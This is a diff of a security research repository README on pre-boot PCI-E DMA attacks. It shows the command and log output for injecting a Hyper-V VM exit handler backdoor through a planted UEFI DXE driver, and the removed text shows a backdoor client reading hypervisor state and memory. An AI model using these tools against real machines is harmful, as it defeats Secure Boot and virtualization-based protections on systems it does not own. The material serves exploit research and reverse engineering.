@@ -3,7 +3,7 @@
 
 ## What
 
-This repository contains a set of tools and proof of concepts related to PCI-E bus and [DMA attacks](https://en.wikipedia.org/wiki/DMA_attack). It includes HDL design which implements software controllable PCI-E gen 1.1 endpoint device for [Xilinx SP605 Evaluation Kit](https://www.xilinx.com/products/boards-and-kits/ek-s6-sp605-g.html) with Spartan-6 FPGA. In comparison with popular [USB3380EVB](http://www.hwtools.net/Adapter/USB3380EVB.html) this design allows to operate with raw Transaction Level Packets (TLP) of PCI-E bus and perform full 64-bit memory read/write operations. To demonstrate applied use cases of the design, [there's a tool](https://github.com/Cr4sh/s6_pcie_microblaze/blob/master/python/uefi_backdoor_simple.py) for pre-boot DMA attacks on UEFI based machines which allows executing arbitrary UEFI DXE drivers during platform init. [Another example](https://github.com/Cr4sh/s6_pcie_microblaze/blob/master/python/uefi_backdoor_hv.py) shows how to use pre-boot DMA attacks to inject [Hyper-V VM exit handler backdoor](https://github.com/Cr4sh/s6_pcie_microblaze/blob/master/python/payloads/DmaBackdoorHv/src/DmaBackdoorHv.c) into the [virtualization-based security](https://docs.microsoft.com/en-us/windows-hardware/design/device-experiences/oem-vbs) enabled Windows 10 Enterprise running on UEFI Secure Boot enabled platform. Provided Hyper-V backdoor PoC might be useful for reverse engineering and exploit development purposes, it [provides an interface](https://github.com/Cr4sh/s6_pcie_microblaze/blob/master/python/payloads/DmaBackdoorHv/backdoor_client/backdoor_client.cpp) for inspecting of hypervisor state (VMCS, physical/virtual memory, registers, etc.) from guest partition and perform the guest to host VM escape attacks. 
+This repository contains a set of tools and proof of concepts related to PCI-E bus and [DMA attacks](https://en.wikipedia.org/wiki/DMA_attack). It includes HDL design which implements software controllable PCI-E gen 1.1 endpoint device for [Xilinx SP605 Evaluation Kit](https://www.xilinx.com/products/boards-and-kits/ek-s6-sp605-g.html) with Spartan-6 FPGA. In comparison with popular [USB3380EVB](http://www.hwtools.net/Adapter/USB3380EVB.html) this design allows to operate with raw Transaction Level Packets (TLP) of PCI-E bus and perform full 64-bit memory read/write operations. To demonstrate applied use cases of the design, [there's a tool](https://github.com/Cr4sh/s6_pcie_microblaze/blob/master/python/uefi_backdoor_simple.py) for pre-boot DMA attacks on UEFI based machines which allows executing arbitrary UEFI DXE drivers during platform init. [Another example](https://github.com/Cr4sh/s6_pcie_microblaze/blob/master/python/uefi_backdoor_hv.py) shows how to use pre-boot DMA attacks to inject [Hyper-V VM exit handler backdoor](https://github.com/Cr4sh/s6_pcie_microblaze/blob/master/python/payloads/DmaBackdoorHv/src/DmaBackdoorHv.c) into the [virtualization-based security](https://docs.microsoft.com/en-us/windows-hardware/design/device-experiences/oem-vbs) enabled Windows 10 Enterprise running on UEFI Secure Boot enabled platform. Provided Hyper-V backdoor PoC might be useful for reverse engineering and exploit development purposes, it [provides an interface](https://github.com/Cr4sh/s6_pcie_microblaze/blob/master/python/payloads/DmaBackdoorHv/backdoor_client/backdoor_library/backdoor_library.cpp) for inspecting of hypervisor state (VMCS, physical/virtual memory, registers, etc.) from guest partition and perform the guest to host VM escape attacks. 
 
 
 ## Contents
@@ -430,204 +430,36 @@ Python program `uefi_backdoor_hv.py` injects Hyper-V VM exit handler backdoor lo
 
 ```
 ./uefi_backdoor_hv.py --payload payloads/DmaBackdoorHv/DmaBackdoorHv_X64.efi
+[+] Reading DXE phase payload from payloads/DmaBackdoorHv/DmaBackdoorHv_X64.efi
+[+] Waiting for PCI-E link...
+[!] PCI-E endpoint is not configured by root complex yet
+[!] PCI-E endpoint is not configured by root complex yet
+[!] PCI-E endpoint is not configured by root complex yet
+[!] Bad MRd TLP completion received
 [+] PCI-E link with target is up
-[+] TSEG is somewhere around 0x8b800000
-[+] PE image is at 0x88930000
-[+] EFI_SYSTEM_TABLE is at 0x8b294f18
-[+] EFI_BOOT_SERVICES is at 0x83201d60
-[+] EFI_BOOT_SERVICES.LocateProtocol() address is 0x83209b88
-Backdoor image size is 0x1c00
-Backdoor entry RVA is 0xa30
-Planting DXE stage driver at 0x10000...
-Hooking LocateProtocol(): 0x83209b88 -> 0x00010a30
-4.077459 sec.
+[+] Looking for DXE driver PE image...
+[+] PE image is at 0x77160000
+[+] EFI_SYSTEM_TABLE is at 0x7a03e018
+[+] EFI_BOOT_SERVICES is at 0x7a38fa30
+[+] EFI_BOOT_SERVICES.LocateProtocol() address is 0x7a3987b4
+Backdoor image size is 0x2c20
+Backdoor entry RVA is 0xbd4
+Planting DXE stage driver at 0xc0000...
+Hooking LocateProtocol(): 0x7a3987b4 -> 0x000c0bd4
+3.611646 sec.
 [+] DXE driver was planted, waiting for backdoor init...
-[+] DXE driver was executed
-[+] Waiting for Hyper-V init...
-[+] Hyper-V image entry was executed
+[+] DXE driver was executed, you can read its debug messages by running this program with -d option
+[+] Waiting for Hyper-V load...
+[+] Hyper-V image was loaded
 
-              Winload CR3: 0x00000000001ab000
-              Hyper-V CR3: 0x00000000007aa000
-  Hyper-V VM exit handler: 0xfffff8000588c410
-      Hyper-V image entry: 0xfffff800058ad3e0
+    Hyper-V image base: 0xfffff8072d690000
+           Image entry: 0xfffff8072d901360
+       VM exit handler: 0xfffff8072d8add90
 
 [+] DONE
 ```
 
-Example of Hyper-V debug messages on attack target screen during platform init:
-
-<img src="https://raw.githubusercontent.com/Cr4sh/s6_pcie_microblaze/master/docs/images/backdoor_hv.jpg" width="640" height="362">
-
-Client program `payloads/DmaBackdoorHv/backdoor_client.exe` is used to interact with the Hyper-V backdoor from the guest partition. Check if backdoor is loaded:
-
-```
-> backdoor_client.exe 0
-[+] Running on CPU #0
-[+] VM exit backdoor is present
-
-      Hypervisor CR0: 0x80010031
-      Hypervisor CR3: 0x7aa000
-      Hypervisor CR4: 0x42260
- Hypervisor IDT base: 0xfffff80005c78040 (limit = 0xffff)
-  Hypervisor GS base: 0xfffff80005c7b000
-     VM exit handler: 0xfffff8000588c410
-       VM exit count: 0xeecbec
-
-Press any key to quit...
-```
-
-Dumping VMCS structure of the current guest:
-
-```
-> backdoor_client.exe 0 --vmcs
-[+] Running on CPU #0
-[+] VMCS dump:
-
-             GUEST_ES_SELECTOR: 0x2b
-             GUEST_CS_SELECTOR: 0x33
-             GUEST_SS_SELECTOR: 0x2b
-             GUEST_DS_SELECTOR: 0x2b
-             GUEST_FS_SELECTOR: 0x53
-             GUEST_GS_SELECTOR: 0x2b
-           GUEST_LDTR_SELECTOR: 0x0
-             GUEST_TR_SELECTOR: 0x40
-              HOST_ES_SELECTOR: 0x20
-              HOST_CS_SELECTOR: 0x10
-              HOST_SS_SELECTOR: 0x20
-              HOST_DS_SELECTOR: 0x20
-              HOST_FS_SELECTOR: 0x20
-              HOST_GS_SELECTOR: 0x20
-              HOST_TR_SELECTOR: 0x30
-                   IO_BITMAP_A: 0x7a3000
-              IO_BITMAP_A_HIGH: 0x0
-                   IO_BITMAP_B: 0x7a4000
-              IO_BITMAP_B_HIGH: 0x0
-                  GUEST_PDPTE0: 0x20000000000
-                  GUEST_PDPTE1: 0x60000010000
-                  GUEST_PDPTE2: 0x40000000000
-                  GUEST_PDPTE3: 0x0
-                   EPT_POINTER: 0x145f101e
-
-  ...
-
-```
-
-Dumping hypervisor IDT handlers:
-
-```
-> backdoor_client.exe 0 --idt
-[+] Running on CPU #0
-[+] Hypervisor IDT dump:
-
-0000: 0xfffff80004250440
-0001: 0xfffff800042504c0
-0002: 0xfffff80004250540
-0003: 0xfffff80004250880
-0004: 0xfffff80004250780
-0005: 0xfffff80004250800
-0006: 0xfffff80004250900
-0007: 0xfffff80004250a00
-0008: 0xfffff80004251000
-0009: 0xfffff80004250f80
-000a: 0xfffff80004251080
-
-...
-
-```
-
-Enumerate running guests:
-
-```
-> backdoor_client.exe 0 --ept-list
-[+] Running on CPU #0
-[+] Collecting EPT address list...
-[+] Reading collected data from 0x2810...
-
-  #00: VPID = 0x0001, EPT = 0x00000000145f101e
-  #01: VPID = 0x0002, EPT = 0x00000000145e601e
-  #02: VPID = 0x028d, EPT = 0x000000012800301e
-  #03: VPID = 0x0001, EPT = 0x00000000145ed01e
-```
-
-Reading physical memory:
-
-```
-> backdoor_client.exe 0 --phys-read 0x2000 0x100
-[+] Running on CPU #0
-[+] Reading 0x100 bytes of physical memory at 0x2000
-0000000000002000: eb 76 00 00 3f 00 10 20  00 00 00 00 00 00 00 00  | .v..?.. ........
-0000000000002010: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  | ................
-0000000000002020: 00 00 00 00 00 9b 20 00  00 00 00 00 00 00 00 00  | ...... .........
-0000000000002030: ff ff 00 00 00 93 cf 00  00 00 00 00 00 00 00 00  | ................
-0000000000002040: ff ff 00 00 00 9b cf 00  00 00 00 00 00 00 00 00  | ................
-0000000000002050: cb 20 00 00 30 00 fd 20  00 00 10 00 00 00 00 00  | . ..0.. ........
-0000000000002060: 60 d5 8a 05 00 f8 ff ff  00 a0 7a 00 00 00 00 00  | `.........z.....
-0000000000002070: 04 00 00 00 01 00 00 00  fa 66 2b c0 8c c8 8e d8  | .........f+.....
-0000000000002080: 66 be 70 00 00 00 67 66  c7 06 01 00 00 00 66 c1  | f.p...gf......f.
-0000000000002090: e0 04 66 8b f8 66 67 0f  01 15 04 00 00 00 0f 20  | ..f..fg........
-00000000000020a0: c0 66 83 c8 11 0f 22 c0  67 f6 05 74 00 00 00 01  | .f....".g..t....
-00000000000020b0: 74 0f 66 b9 a0 01 00 00  0f 32 66 0f ba f2 22 0f  | t.f......2f...".
-00000000000020c0: 30 b8 20 00 8e d8 66 67  ff 6f 50 c7 47 70 02 00  | 0. ...fg.oP.Gp..
-00000000000020d0: 00 00 0f 20 e0 83 c8 20  0f 22 e0 8b 47 68 0f 22  | ... ... ."..Gh."
-00000000000020e0: d8 b9 80 00 00 c0 0f 32  0d 00 01 00 00 0f 30 0f  | .......2......0.
-00000000000020f0: 20 c0 0d 00 00 00 80 0f  22 c0 ff 6f 56 8b ff 48  |  ......."..oV..H
-```
-
-Translating guest physical address to host physical address:
-
-```
-> backdoor_client.exe 0 --phys-translate 0x145f1000 0x1d4bf0000
-[+] Running on CPU #0
-backdoor_phys_translate(): EPT PML4 is at 0x145f1000, VA is 0x1d4bf0000
-EPT PML4E 0x145f1000[0x0]: 0x145f9007
-EPT PDPTE 0x145f9000[0x7]: 0x150bf007
-  EPT PDE 0x150bf000[0xa5]: 0x1d4a000b7
-
-0x00000001d4bf0000 -> 0x00000001d4bf0000
-```
-
-Translating guest virtual address to host physical address:
-
-```
-> backdoor_client.exe 0 --virt-translate 0x1ab000 0xfffff8017d1d5000 0x145f1000
-[+] Running on CPU #0
-backdoor_virt_translate(): PML4 is at 0x1ab000, VA is 0xfffff8017d1d5000
-backdoor_phys_translate(): EPT PML4 is at 0x145f1000, VA is 0x1abf80
-EPT PML4E 0x145f1000[0x0]: 0x145f9007
-EPT PDPTE 0x145f9000[0x0]: 0x14612007
-  EPT PDE 0x14612000[0x0]: 0x212b4007
-  EPT PTE 0x212b4000[0x1ab]: 0x85900000001ab037
-PML4E 0x1ab000[0x1f0]: 0x1344063
-backdoor_phys_translate(): EPT PML4 is at 0x145f1000, VA is 0x1344028
-EPT PML4E 0x145f1000[0x0]: 0x145f9007
-EPT PDPTE 0x145f9000[0x0]: 0x14612007
-  EPT PDE 0x14612000[0x9]: 0x212a3007
-  EPT PTE 0x212a3000[0x144]: 0x8590000001344037
-PDPTE 0x1344000[0x5]: 0x1345063
-backdoor_phys_translate(): EPT PML4 is at 0x145f1000, VA is 0x1345f40
-EPT PML4E 0x145f1000[0x0]: 0x145f9007
-EPT PDPTE 0x145f9000[0x0]: 0x14612007
-  EPT PDE 0x14612000[0x9]: 0x212a3007
-  EPT PTE 0x212a3000[0x145]: 0x8590000001345037
-  PDE 0x1345000[0x1e8]: 0x1395063
-backdoor_phys_translate(): EPT PML4 is at 0x145f1000, VA is 0x1395ea8
-EPT PML4E 0x145f1000[0x0]: 0x145f9007
-EPT PDPTE 0x145f9000[0x0]: 0x14612007
-  EPT PDE 0x14612000[0x9]: 0x212a3007
-  EPT PTE 0x212a3000[0x195]: 0x8590000001395037
-  PTE 0x1395000[0x1d5]: 0x80000000033d5963
-backdoor_phys_translate(): EPT PML4 is at 0x145f1000, VA is 0x33d5000
-EPT PML4E 0x145f1000[0x0]: 0x145f9007
-EPT PDPTE 0x145f9000[0x0]: 0x14612007
-  EPT PDE 0x14612000[0x19]: 0x21283007
-  EPT PTE 0x21283000[0x1d5]: 0x85900000033d5037
-
-0xfffff8017d1d5000 -> 0x00000000033d5000
-```
-
-Also, `backdoor_client.exe` can inject dummy driver located in `payloads/DmaBackdoorHv/backdoor_driver.sys` from guest Hyper-V partition to host Hyper-V partition:
-
-<img src="https://raw.githubusercontent.com/Cr4sh/s6_pcie_microblaze/master/docs/images/backdoor_vm_inject.png" width="749" height="498">
+To get more information about Hyper-V backdoor usage check its [README](https://github.com/Cr4sh/s6_pcie_microblaze/blob/master/python/payloads/DmaBackdoorHv/README.MD) file.
 
 
 ## Option ROM attacks
